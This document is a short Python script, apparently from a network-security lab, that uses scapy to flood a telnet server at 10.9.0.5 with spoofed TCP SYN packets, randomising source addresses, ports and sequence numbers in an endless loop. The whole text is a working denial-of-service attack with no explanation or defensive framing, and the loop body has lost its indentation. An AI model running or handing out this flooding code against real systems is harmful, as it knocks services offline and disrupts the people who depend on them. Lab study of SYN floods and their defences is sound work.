#!/usr/bin/env python3



from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits



ip = IP(dst="10.9.0.5") # victim ip address
tcp = TCP(dport=23, flags='S') # telnet port 23, Flag S for Syn Packet
pkt = ip/tcp



while True:
pkt[IP].src = str(IPv4Address(getrandbits(32))) # source ip
pkt[TCP].sport = getrandbits(16) # source port
pkt[TCP].seq = getrandbits(32) # sequence number
send(pkt, iface = 'br-85a24fcfd2f6', verbose = 0)